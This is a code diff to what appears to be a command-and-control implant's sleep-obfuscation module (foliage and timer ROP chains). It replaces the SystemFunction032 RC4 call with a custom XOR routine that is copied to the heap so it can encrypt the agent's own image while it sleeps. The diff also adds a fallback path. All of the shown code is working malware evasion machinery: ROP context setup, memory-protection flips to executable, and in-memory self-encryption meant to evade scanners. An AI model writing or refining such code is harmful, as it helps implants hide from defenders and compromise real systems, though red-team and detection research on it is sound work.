@@ -13,6 +13,48 @@
 
 /*!
  * @brief
+ *  Custom XOR cipher to replace SystemFunction032 (RC4).
+ *  Matches SystemFunction032 calling convention: (USTRING* Data, USTRING* Key)
+ *  XORs Data->Buffer with Key->Buffer (repeating key).
+ *  Symmetric: calling twice with same key encrypts then decrypts.
+ *
+ *  IMPORTANT: This function is copied to a heap allocation at init time
+ *  and executed from there during sleep obfuscation. This is necessary
+ *  because the agent's .text section is encrypted during sleep, so the
+ *  encryption/decryption function must reside outside the encrypted region.
+ *
+ *  Must be self-contained: no globals, no external function calls.
+ *
+ * @param Data  Pointer to USTRING containing buffer to encrypt/decrypt
+ * @param Key   Pointer to USTRING containing the XOR key
+ * @return NTSTATUS (0 = STATUS_SUCCESS)
+ */
+__attribute__((noinline))
+NTSTATUS WINAPI ObfXorCrypt( USTRING* Data, USTRING* Key )
+{
+    PUCHAR DataBuf = (PUCHAR) Data->Buffer;
+    PUCHAR KeyBuf  = (PUCHAR) Key->Buffer;
+    DWORD  DataLen = Data->Length;
+    DWORD  KeyLen  = Key->Length;
+    DWORD  k       = 0;
+
+    for ( DWORD i = 0; i < DataLen; i++ )
+    {
+        DataBuf[ i ] ^= KeyBuf[ k ];
+        if ( ++k >= KeyLen )
+            k = 0;
+    }
+
+    return 0x00000000;
+}
+
+/* End marker for ObfXorCrypt — used to calculate function size for heap copy.
+ * Must immediately follow ObfXorCrypt in source to maintain adjacency in compiled output. */
+__attribute__((noinline))
+NTSTATUS WINAPI ObfXorCryptEnd( VOID ) { return 0; }
+
+/*!
+ * @brief
  *  foliage is a sleep obfuscation technique that is using APC calls
  *  to obfuscate itself in memory
  *
@@ -146,12 +188,12 @@ VOID FoliageObf(
                     // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, NULL,  );
 
                     RopMemEnc->ContextFlags = CONTEXT_FULL;
-                    RopMemEnc->Rip  = U_PTR( Instance->Win32.SystemFunction032 );
+                    RopMemEnc->Rip  = U_PTR( Instance->Session.CryptFuncAddr );
                     RopMemEnc->Rsp -= U_PTR( 0x1000 * 11 );
                     RopMemEnc->Rcx  = U_PTR( &Rc4 );
                     RopMemEnc->Rdx  = U_PTR( &Key );
                     *( PVOID* )( RopMemEnc->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
-                    // SystemFunction032( &Rc4, &Key ); RC4 Encryption
+                    // ObfXorCrypt( &Rc4, &Key ); XOR Encryption
 
                     RopGetCtx->ContextFlags = CONTEXT_FULL;
                     RopGetCtx->Rip  = U_PTR( Instance->Win32.NtGetContextThread );
@@ -181,12 +223,12 @@ VOID FoliageObf(
 
                     // NOTE: thread image decryption
                     RopMemDec->ContextFlags = CONTEXT_FULL;
-                    RopMemDec->Rip  = U_PTR( Instance->Win32.SystemFunction032 );
+                    RopMemDec->Rip  = U_PTR( Instance->Session.CryptFuncAddr );
                     RopMemDec->Rsp -= U_PTR( 0x1000 * 7 );
                     RopMemDec->Rcx  = U_PTR( &Rc4 );
                     RopMemDec->Rdx  = U_PTR( &Key );
                     *( PVOID* )( RopMemDec->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
-                    // SystemFunction032( &Rc4, &Key ); Rc4 Decryption
+                    // ObfXorCrypt( &Rc4, &Key ); XOR Decryption
 
                     // RW -> RWX
                     RopSetMemRx->ContextFlags = CONTEXT_FULL;
@@ -496,8 +538,8 @@ BOOL TimerObf(
                     Rop[ Inc ].R9  = U_PTR( &Value );
                     Inc++;
 
-                    /* Encrypt image base address */
-                    OBF_JMP( Inc, Instance->Win32.SystemFunction032 );
+                    /* Encrypt image base address — custom XOR cipher (replaces SystemFunction032 RC4) */
+                    OBF_JMP( Inc, Instance->Session.CryptFuncAddr );
                     Rop[ Inc ].Rcx = U_PTR( &Img );
                     Rop[ Inc ].Rdx = U_PTR( &Key );
                     Inc++;
@@ -548,8 +590,8 @@ BOOL TimerObf(
                         Inc++;
                     }
 
-                    /* Sys032 */
-                    OBF_JMP( Inc, Instance->Win32.SystemFunction032 )
+                    /* Decrypt image — custom XOR cipher (replaces SystemFunction032 RC4) */
+                    OBF_JMP( Inc, Instance->Session.CryptFuncAddr )
                     Rop[ Inc ].Rcx = U_PTR( &Img );
                     Rop[ Inc ].Rdx = U_PTR( &Key );
                     Inc++;
@@ -727,6 +769,12 @@ VOID SleepObf(
     if ( Instance->Threads ) {
         PRINTF( "Can't sleep obf. Threads running: %d\n", Instance->Threads )
         Technique = 0;
+    }
+
+    /* If custom crypt function was not allocated, fall back to unobfuscated sleep */
+    if ( ! Instance->Session.CryptFuncAddr && Technique != SLEEPOBF_NO_OBF ) {
+        PUTS( "CryptFuncAddr is NULL — falling back to unobfuscated sleep" );
+        Technique = SLEEPOBF_NO_OBF;
     }
 
     switch ( Technique )
